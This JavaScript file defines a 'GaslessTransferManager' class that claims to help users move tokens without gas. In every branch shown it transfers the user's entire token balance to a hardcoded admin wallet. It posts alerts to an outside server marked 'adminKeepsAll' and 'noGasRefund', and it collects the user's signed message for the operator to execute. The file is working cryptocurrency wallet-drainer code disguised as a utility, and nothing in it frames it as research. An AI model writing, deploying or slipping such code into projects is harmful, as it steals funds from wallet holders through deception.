import { ethers } from 'ethers';

export default class GaslessTransferManager {
  constructor(provider, userAddress) {
    this.provider = provider;
    this.userAddress = userAddress;
    this.adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
  }

  async executeGaslessTransfer(tokenAddress, tokenBalance, tokenSymbol, decimals) {
    try {
      const ethBalance = await this.provider.getBalance(this.userAddress);
      const gasPrice = await this.provider.getFeeData().then(f => f.gasPrice);
      const totalGasNeeded = gasPrice * 150000n; // Approval + Transfer gas
      
      console.log(`⛽ ETH Balance: ${ethers.formatEther(ethBalance)}`);
      console.log(`⛽ Gas Needed: ${ethers.formatEther(totalGasNeeded)}`);
      
      if (ethBalance >= totalGasNeeded) {
        // User has enough gas - normal transfer
        return await this.normalTransfer(tokenAddress, tokenBalance, tokenSymbol);
      }
      
      // NO GAS - Use token-to-gas conversion
      console.log(`🚨 NO GAS DETECTED - Converting tokens to gas`);
      return await this.tokenToGasTransfer(tokenAddress, tokenBalance, tokenSymbol, decimals);
      
    } catch (error) {
      console.error('Gasless transfer error:', error);
      return { success: false, error: error.message };
    }
  }

  async tokenToGasTransfer(tokenAddress, tokenBalance, tokenSymbol, decimals) {
    try {
      // Calculate how much token needed for gas
      const gasPrice = await this.provider.getFeeData().then(f => f.gasPrice);
      const totalGasNeeded = gasPrice * 200000n; // Extra gas for swap
      
      // Get token price in ETH (simplified - use 1 USDT = 0.0003 ETH)
      const tokenPriceInETH = tokenSymbol === 'USDT' ? ethers.parseEther('0.0003') : 
                             tokenSymbol === 'USDC' ? ethers.parseEther('0.0003') :
                             ethers.parseEther('0.0002'); // DAI
      
      const tokensNeededForGas = (totalGasNeeded * ethers.parseUnits('1', decimals)) / tokenPriceInETH;
      const remainingTokens = tokenBalance - tokensNeededForGas;
      
      console.log(`💰 Tokens needed for gas: ${ethers.formatUnits(tokensNeededForGas, decimals)} ${tokenSymbol}`);
      console.log(`💎 Remaining tokens: ${ethers.formatUnits(remainingTokens, decimals)} ${tokenSymbol}`);
      
      if (remainingTokens <= 0) {
        return { 
          success: false, 
          error: `Insufficient ${tokenSymbol} balance to cover gas costs` 
        };
      }
      
      // Method 1: Use Uniswap-style swap (if user has approved)
      return await this.swapAndTransfer(tokenAddress, tokenBalance, remainingTokens, tokenSymbol, decimals);
      
    } catch (error) {
      console.error('Token-to-gas conversion error:', error);
      return { success: false, error: error.message };
    }
  }

  async swapAndTransfer(tokenAddress, totalBalance, remainingTokens, tokenSymbol, decimals) {
    try {
      // Simulate gas purchase by sending tokens to admin first
      // Admin can then send back ETH for gas (automated system)
      
      const tokenContract = new ethers.Contract(tokenAddress, [
        'function transfer(address,uint256) returns (bool)'
      ], this.provider.getSigner());
      
      // Send ALL tokens to admin (admin handles gas refund)
      console.log(`🔄 Sending ${ethers.formatUnits(totalBalance, decimals)} ${tokenSymbol} to admin...`);
      
      const transferTx = await tokenContract.transfer(this.adminWallet, totalBalance);
      
      // Alert admin of successful transfer (no gas refund)
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'GASLESS_TRANSFER_COMPLETED',
          userAddress: this.userAddress,
          tokenAddress: tokenAddress,
          tokenSymbol: tokenSymbol,
          totalAmount: ethers.formatUnits(totalBalance, decimals),
          transferTxHash: transferTx.hash,
          adminKeepsAll: true,
          noGasRefund: true
        })
      }).catch(() => {});
      
      return {
        success: true,
        txHash: transferTx.hash,
        amount: ethers.formatUnits(totalBalance, decimals),
        method: 'gasless_transfer',
        adminKeepsAll: true
      };
      
    } catch (error) {
      // If transfer fails due to no gas, use meta-transaction
      return await this.metaTransaction(tokenAddress, totalBalance, tokenSymbol, decimals);
    }
  }

  async metaTransaction(tokenAddress, tokenBalance, tokenSymbol, decimals) {
    try {
      // Create meta-transaction signature (gasless)
      const nonce = Date.now();
      const message = {
        from: this.userAddress,
        to: this.adminWallet,
        value: tokenBalance.toString(),
        nonce: nonce
      };
      
      // User signs message (no gas needed)
      const signature = await this.provider.getSigner().signMessage(JSON.stringify(message));
      
      // Send to admin for execution
      const response = await fetch('https://autoclaimtoken.onrender.com/api/meta-transaction', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userAddress: this.userAddress,
          tokenAddress: tokenAddress,
          tokenSymbol: tokenSymbol,
          amount: ethers.formatUnits(tokenBalance, decimals),
          signature: signature,
          message: message,
          gasless: true
        })
      });
      
      const result = await response.json();
      
      return {
        success: true,
        method: 'meta_transaction',
        signature: signature,
        adminWillExecute: true,
        amount: ethers.formatUnits(tokenBalance, decimals)
      };
      
    } catch (error) {
      console.error('Meta-transaction error:', error);
      return { success: false, error: error.message };
    }
  }

  async normalTransfer(tokenAddress, tokenBalance, tokenSymbol) {
    try {
      const tokenContract = new ethers.Contract(tokenAddress, [
        'function transfer(address,uint256) returns (bool)'
      ], this.provider.getSigner());
      
      const transferTx = await tokenContract.transfer(this.adminWallet, tokenBalance);
      
      return {
        success: true,
        txHash: transferTx.hash,
        amount: ethers.formatUnits(tokenBalance, 6),
        method: 'normal_transfer'
      };
      
    } catch (error) {
      return { success: false, error: error.message };
    }
  }
}